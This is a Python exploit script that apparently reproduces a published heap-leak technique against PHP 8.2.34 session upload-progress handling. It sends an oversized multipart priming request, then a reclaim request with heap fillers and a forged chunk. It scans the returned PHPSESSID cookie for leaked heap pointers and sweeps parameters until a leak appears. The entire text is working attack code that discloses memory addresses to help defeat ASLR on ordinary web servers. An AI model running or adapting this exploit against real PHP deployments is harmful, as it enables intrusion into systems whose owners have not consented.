#!/usr/bin/env python3
"""Replicate dimasa0305 leak_heap EXACTLY (incl. multipart file upload) on a target port.
Their structure: prime=1001 small + PHPSESSID=0 + upload_progress + FILE UPLOAD + big;
reclaim=PHPSESSID(32) + upload_progress + heap_fillers(48B) + forged(79B,len=0x1000).
Checks Set-Cookie for a 0x7F heap pointer. Sweeps heap_fillers + big size.
"""
import http.client, struct, time, sys, socket

PORT = int(sys.argv[1]) if len(sys.argv) > 1 else 18111
H = 0x7F0000000000

def scan(data, need=8):
    best = {}
    for off in range(len(data) - 8):
        v = int.from_bytes(data[off:off+8], "little")
        if H <= v < H + 0x10000000000:
            best[v & ~0x1FFFFF] = best.get(v & ~0x1FFFFF, 0) + 1
    if best:
        b, c = max(best.items(), key=lambda kv: kv[1])
        if c >= 8: return b
    return 0

def do(req_lines, body, timeout=60):
    try:
        c = http.client.HTTPConnection("127.0.0.1", PORT, timeout=timeout)
        c.putrequest("POST", "/", skip_host=True)
        for l in req_lines: c.putheader(l.split(":", 1)[0], l.split(":", 1)[1].strip())
        c.endheaders()
        c.send(body)
        r = c.getresponse(); d = r.read(); c.close()
        return d
    except Exception as e:
        return b"ERR " + str(e).encode()

def multipart(parts, big_field=None, big_bytes=0):
    """parts = list of (name, value). big_field = (name, bytes) optional."""
    bd = "----p2sBoundary"
    out = b""
    for name, val in parts:
        if isinstance(val, tuple):  # file upload (filename, content)
            fn, content = val
            out += (f"--{bd}\r\nContent-Disposition: form-data; name=\"{name}\"; filename=\"{fn}\"\r\n"
                    f"Content-Type: application/octet-stream\r\n\r\n").encode() + content + b"\r\n"
        else:
            out += (f"--{bd}\r\nContent-Disposition: form-data; name=\"{name}\"\r\n\r\n").encode() + val + b"\r\n"
    if big_field:
        nm, content = big_field
        out += (f"--{bd}\r\nContent-Disposition: form-data; name=\"{nm}\"\r\n\r\n").encode() + content + b"\r\n"
    out += f"--{bd}--\r\n".encode()
    return out

def try_combo(port, heap_fillers, big_mb, sid=b"attacksessionid0001"):
    # PRIME (req1): OOM. dimasa0305: 1001 small + PHPSESSID + upload_progress + FILE upload + big
    prime = [(f"p{i:04d}", b"x") for i in range(1001)]
    prime.append(("PHPSESSID", b"\x00"))
    prime.append(("PHP_SESSION_UPLOAD_PROGRESS", b"pwn"))
    prime.append(("f", ("a.txt", b"A" * 64)))  # FILE UPLOAD (dima difference)
    body = multipart(prime, big_field=("big", b"B" * (big_mb * 1024 * 1024)))
    do(["Content-Type: multipart/form-data; boundary=p2sBoundary",
        "Content-Length: %d" % len(body)], body, timeout=90)
    time.sleep(0.3)
    # RECLAIM (req2): leak
    rec = [("PHPSESSID", sid), ("PHP_SESSION_UPLOAD_PROGRESS", b"pwn")]
    for i in range(heap_fillers):
        rec.append((str(1000 + i), (f"v{i:04d}" + "x" * 44)[:48].encode()))
    forged = bytearray(b"A" * 79); struct.pack_into("<Q", forged, 0x10, 0x1000); forged[0x18] = ord("L")
    rec.append(("1999", bytes(forged)))
    body2 = multipart(rec)
    r = do(["Content-Type: multipart/form-data; boundary=p2sBoundary",
            "Content-Length: %d" % len(body2)], body2, timeout=60)
    # find Set-Cookie
    cookie = b""
    for line in r.split(b"\r\n"):
        if line.lower().startswith(b"set-cookie:") and b"phpsessid" in line.lower():
            cookie = line.split(b":", 1)[1].strip()
    return scan(cookie), len(cookie)

print(f"=== dimasa0305 structure on port {PORT} (8.2.34) ===")
for hf in [64, 128, 256, 512, 841]:
    for bm in [64, 256]:
        base, cl = try_combo(PORT, hf, bm)
        bs = ("0x%08x" % base) if base else "0x0"
        print(f"  heap_fillers={hf} big={bm}MB -> cookie={cl}B base={bs}", flush=True)
        if base:
            print("  *** LEAK ***", flush=True)
print("done")
